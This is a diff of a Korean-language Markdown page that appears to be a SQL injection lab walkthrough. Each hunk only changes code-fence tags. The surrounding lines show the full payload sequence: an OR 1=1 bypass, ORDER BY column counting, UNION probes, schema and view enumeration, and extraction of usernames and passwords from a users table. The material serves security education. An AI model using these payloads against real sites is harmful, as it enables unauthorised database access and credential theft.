@@ -34,7 +34,7 @@ draft: false
 
 **실행:**
 
-~~~sql
+~~~sql nohighlight
 ' OR 1=1 --
 ~~~
 
@@ -48,7 +48,7 @@ draft: false
 
 **실행:**
 
-~~~sql
+~~~sql nohighlight
 ' OR 1=1 ORDER BY 1 --
 ' OR 1=1 ORDER BY 2 --
 ' OR 1=1 ORDER BY 3 --
@@ -64,7 +64,7 @@ draft: false
 
 **실행:**
 
-~~~sql
+~~~sql nohighlight
 ' UNION SELECT 'probe', NULL --
 ' UNION SELECT NULL, 'probe' --
 ~~~
@@ -79,7 +79,7 @@ draft: false
 
 **실행:**
 
-~~~sql
+~~~sql nohighlight
 ' UNION SELECT view_name, NULL FROM all_views --
 ~~~
 
@@ -93,7 +93,7 @@ draft: false
 
 **실행:**
 
-~~~sql
+~~~sql nohighlight
 ' UNION SELECT table_schema, table_name FROM information_schema.tables --
 ~~~
 
@@ -112,7 +112,7 @@ public  products
 
 **실행:**
 
-~~~sql
+~~~sql nohighlight
 ' UNION SELECT column_name, data_type
 FROM information_schema.columns
 WHERE table_schema = 'public'
@@ -131,7 +131,7 @@ WHERE table_schema = 'public'
 
 **실행:**
 
-~~~sql
+~~~sql nohighlight
 ' UNION SELECT username_hxfyzh, password_zdayfw FROM public.users_ntqhfo --
 ~~~
 
